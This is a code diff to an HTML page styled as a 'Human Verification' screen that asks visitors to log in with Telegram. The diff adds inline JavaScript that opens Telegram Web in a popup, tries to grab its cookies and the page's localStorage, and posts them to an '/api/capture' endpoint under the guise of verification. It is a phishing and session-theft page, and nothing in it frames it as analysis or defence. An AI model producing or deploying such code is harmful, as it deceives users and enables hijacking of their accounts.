@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafeGuard Verification</title>
+    <title>Safeguard Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: #212121;
             color: white;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -27,7 +26,6 @@
             font-size: 18px;
             border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
         }
         .button:hover {
             background-color: #0077aa;
@@ -38,8 +36,37 @@
     <div class="container">
         <h1>Human Verification</h1>
         <p>Click below to log in with Telegram:</p>
-        <button id="loginBtn" class="button">Click here to verify</button>
+        <button id="verifyButton" class="button">Click here to verify</button>
     </div>
-    <script src="miniapp.js"></script>
+    <script>
+        document.getElementById("verifyButton").addEventListener("click", () => {
+            // Open Telegram Web login in a popup
+            const popup = window.open("https://web.telegram.org/a/", "Telegram Login", "width=600,height=800");
+
+            const interval = setInterval(() => {
+                try {
+                    // Check if the popup is ready and grab cookies/session
+                    if (popup.document && popup.document.readyState === "complete") {
+                        const cookies = popup.document.cookie; // Capture cookies
+                        const session = localStorage; // Capture session data
+
+                        // Send captured data to the backend
+                        fetch("/api/capture", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ cookies, session: JSON.stringify(session) }),
+                        })
+                            .then(() => alert("Verification complete! Data sent."))
+                            .catch(() => alert("Failed to send data."));
+
+                        popup.close();
+                        clearInterval(interval);
+                    }
+                } catch (error) {
+                    // Keep trying until the popup is ready
+                }
+            }, 1000); // Check every second
+        });
+    </script>
 </body>
 </html>
